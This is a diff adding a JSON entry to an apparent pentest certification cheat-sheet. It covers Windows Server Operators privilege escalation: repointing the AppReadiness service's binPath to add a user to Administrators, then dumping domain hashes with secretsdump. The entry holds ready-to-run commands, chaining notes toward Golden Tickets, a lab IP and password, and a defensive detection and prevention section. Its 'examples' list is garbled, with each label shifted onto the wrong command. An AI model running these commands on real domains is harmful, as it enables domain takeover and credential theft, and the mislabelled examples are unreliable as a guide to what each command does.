@@ -1,0 +1,99 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "sc",
+    "psservice"
+  ],
+  "tags": [
+    "server-operators",
+    "service",
+    "domain-admin"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Server Operators",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Check the service's current config",
+      "command": "c:\\Tools\\PsService.exe security AppReadiness"
+    },
+    {
+      "label": "Confirm you can modify it (PsService)",
+      "command": "sc config AppReadiness binPath= \"cmd /c net localgroup Administrators server_adm /add\""
+    },
+    {
+      "label": "Repoint binPath to add yourself to Administrators",
+      "command": "sc start AppReadiness"
+    },
+    {
+      "label": "Start the service",
+      "command": "crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'"
+    },
+    {
+      "label": "Validate admin access with CME",
+      "command": "secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator"
+    }
+  ],
+  "notes": "=== Server Operators — Service Binary Path Modification → SYSTEM ===\nServer Operators have SERVICE_ALL_ACCESS over many DC services — modify binPath to run arbitrary commands.\n\n=== WHY THIS WORKS ===\nServer Operators hold SERVICE_ALL_ACCESS over many services on DCs.\nsc config changes a service's binPath to any command.\nService runs as LocalSystem → any binPath command executes as SYSTEM.\nService fails to start (error 1053) but command runs before the timeout — success.\n\n=== ATTACK FLOW ===\nStep 1: Identify target service\n  sc qc AppReadiness   → confirm SERVICE_START_NAME: LocalSystem\n  PsService.exe security AppReadiness → shows BUILTIN\\Server Operators: All\n\nStep 2: Modify binary path\n  sc config AppReadiness binPath= \"cmd /c net localgroup Administrators server_adm /add\"\n  (cmd /c required — net.exe is not a standalone binary)\n\nStep 3: Stop + start service\n  sc stop AppReadiness\n  sc start AppReadiness\n  → StartService FAILED 1053 is EXPECTED — command ran before timeout\n\nStep 4: Verify + escalate\n  net localgroup Administrators   → confirm account added\n  crackmapexec smb <DC_IP> -u server_adm -p <pass>   → verify admin access\n\nStep 5: DCSync\n  python3 secretsdump.py -just-dc-user administrator domain/server_adm:<pass>@<DC_IP>\n  → Administrator NTLM hash + Kerberos keys → pass-the-hash everywhere\n\n=== CLEANUP (RESTORE SERVICE) ===\nsc config AppReadiness binPath= \"C:\\Windows\\System32\\appreadiness.dll\"\nsc start AppReadiness\nCoordinate with client — modifying production service binary path can cause service disruption\n\n=== CHAINING CONTEXT ===\nServer Operators → add to local Admins → secretsdump via DRSUAPI → all domain hashes\nbinPath = reverse shell → SYSTEM → LSASS dump → DA hash → full domain\nDCSync gives: NTLM hashes, Kerberos keys, krbtgt → Golden Ticket generation\n\n=== WHAT TO LOOK FOR ===\nServer Operators membership = reliable one-step path to DC compromise\nsc.exe is built into every Windows install → zero external tool requirement\nServices usable as targets: AppReadiness, Browser, Dhcp, Dnscache, etc. (any LocalSystem service Server Operators can start)",
+  "references": [
+    {
+      "title": "Microsoft - Service Security and Access Rights",
+      "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "weak-service-acl-binpath",
+      "note": "The generic weak-service-ACL version of this.",
+      "rel": "alternative"
+    },
+    {
+      "id": "winpe-user-group-enum",
+      "note": "Confirms Server Operators membership.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "serveroperators-service",
+  "name": "Server Operators - Modify Service binPath",
+  "command": "sc config AppReadiness binPath= \"cmd /c net localgroup Administrators <user> /add\"",
+  "description": "Server Operators can reconfigure services running as SYSTEM. Point a service's binPath at a command that adds you to Administrators, start it, then dump the DC hashes. On a DC this yields Domain Admin.",
+  "opsec": "loud",
+  "mitre": [
+    "T1543.003"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Server Operators can start and stop system services and modify service configurations. This includes changing the binary path (BinPath) of a service. If a service runs as LocalSystem (SYSTEM), changing its BinPath to an attacker command and starting the service executes that command as SYSTEM.",
+    "prerequisites": "Membership in Server Operators group. A service running as LocalSystem that can be stopped and started. PsService or sc.exe for service modification.",
+    "impact": "Arbitrary command execution as SYSTEM. Typical payload: add attacker user to local Administrators group, enabling full system and DC access.",
+    "detection": "Service configuration change events (Event ID 7040: service start type changed, 4657: registry key modified). Service binary path change via sc.exe or WMI. PsService.exe execution by Server Operators member. Service started with unusual executable path.",
+    "artifacts": "System event 7040: AppReadiness service configuration changed | Security event 4657: HKLM\\System\\CurrentControlSet\\Services\\AppReadiness\\ImagePath modified | net localgroup administrators showing unexpected member",
+    "prevention": "Audit Server Operators group membership — treat as equivalent to local admin on DCs. Restrict local DC logon rights. Monitor service configuration changes via event auditing. Apply principle of least privilege: Server Operators should not need to modify arbitrary service paths.",
+    "misconfiguration": "Accounts added to Server Operators without requirement justification. Services running as LocalSystem that Server Operators can stop/start/modify. No alerting on service BinPath changes.",
+    "vulnerable_config": "# Server Operators can change service BinPath:\nsc config AppReadiness binPath= 'cmd /c net localgroup Administrators server_adm /add'\nsc start AppReadiness\n# AppReadiness runs as LocalSystem, executes the net command as SYSTEM",
+    "secure_config": "# Audit Server Operators\nGet-LocalGroupMember -Group 'Server Operators'\n\n# Restrict service modification rights\n# Review service DACLs:\nsc sdshow AppReadiness\n\n# Monitor service config changes:\n# Audit: Object Access on HKLM\\SYSTEM\\CurrentControlSet\\Services\\*\\ImagePath\n\n# Prefer running services as dedicated service accounts (not LocalSystem)",
+    "sources": [
+      "HTB M26",
+      "MITRE T1543.003",
+      "MITRE T1078.002"
+    ]
+  }
+}
